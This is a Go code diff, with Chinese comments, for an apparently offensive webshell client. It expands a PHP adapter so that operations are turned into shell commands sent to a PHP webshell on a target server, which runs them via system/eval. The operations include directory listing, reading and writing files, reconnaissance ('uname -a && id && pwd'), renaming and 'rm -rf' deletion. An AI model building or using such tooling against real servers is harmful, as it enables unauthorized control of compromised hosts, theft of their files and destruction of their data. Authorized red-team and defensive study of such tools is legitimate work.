@@ -46,25 +46,85 @@ func (a *PHPAdapter) Check(ctx context.Context, t *target.Target) error {
 }
 
 // Execute 在目标上执行统一操作。
-// Phase 3 仅实现 command 类型的基础执行，其余操作后续阶段实现。
 func (a *PHPAdapter) Execute(ctx context.Context, t *target.Target, op *operation.Operation) (*operation.Result, error) {
+	cmd, err := a.buildCommand(op)
+	if err != nil {
+		return &operation.Result{Success: false, Error: err.Error()}, nil
+	}
+
+	resp, err := a.sendCommand(ctx, t, cmd)
+	if err != nil {
+		return &operation.Result{Success: false, Error: err.Error()}, nil
+	}
+	return &operation.Result{Success: true, Output: string(resp.Body)}, nil
+}
+
+// buildCommand 根据操作类型构造要执行的命令。
+// 命令为 shell 命令（目标端 PHP webshell 通过 system/eval 执行）。
+func (a *PHPAdapter) buildCommand(op *operation.Operation) (string, error) {
 	switch op.Type {
 	case operation.OperationCommand:
 		cmd, _ := op.Params["cmd"].(string)
 		if cmd == "" {
-			return &operation.Result{Success: false, Error: "缺少 cmd 参数"}, nil
+			return "", fmt.Errorf("缺少 cmd 参数")
 		}
-		resp, err := a.sendCommand(ctx, t, cmd)
-		if err != nil {
-			return &operation.Result{Success: false, Error: err.Error()}, nil
+		return cmd, nil
+
+	case operation.OperationListDir:
+		path, _ := op.Params["path"].(string)
+		if path == "" {
+			path = "."
 		}
-		return &operation.Result{Success: true, Output: string(resp.Body)}, nil
+		return "ls -la " + shellQuote(path), nil
+
+	case operation.OperationReadFile:
+		path, _ := op.Params["path"].(string)
+		if path == "" {
+			return "", fmt.Errorf("缺少 path 参数")
+		}
+		return "cat " + shellQuote(path), nil
+
+	case operation.OperationWriteFile:
+		path, _ := op.Params["path"].(string)
+		content, _ := op.Params["content"].(string)
+		if path == "" {
+			return "", fmt.Errorf("缺少 path 参数")
+		}
+		return "printf '%s' " + shellQuote(content) + " > " + shellQuote(path), nil
+
+	case operation.OperationSystemInfo:
+		return "uname -a && id && pwd", nil
+
+	case operation.OperationRename:
+		from, _ := op.Params["from"].(string)
+		to, _ := op.Params["to"].(string)
+		if from == "" || to == "" {
+			return "", fmt.Errorf("缺少 from/to 参数")
+		}
+		return "mv " + shellQuote(from) + " " + shellQuote(to), nil
+
+	case operation.OperationMkdir:
+		path, _ := op.Params["path"].(string)
+		if path == "" {
+			return "", fmt.Errorf("缺少 path 参数")
+		}
+		return "mkdir -p " + shellQuote(path), nil
+
+	case operation.OperationDelete:
+		path, _ := op.Params["path"].(string)
+		if path == "" {
+			return "", fmt.Errorf("缺少 path 参数")
+		}
+		return "rm -rf " + shellQuote(path), nil
+
 	default:
-		return &operation.Result{
-			Success: false,
-			Error:   fmt.Sprintf("协议 %q 暂不支持操作 %q", a.Name(), op.Type),
-		}, nil
+		return "", fmt.Errorf("协议 %q 暂不支持操作 %q", a.Name(), op.Type)
 	}
+}
+
+// shellQuote 对 shell 参数做基础转义，降低命令注入风险。
+func shellQuote(s string) string {
+	return "'" + strings.ReplaceAll(s, "'", "'\\''") + "'"
 }
 
 // sendCommand 构造并发送命令请求。
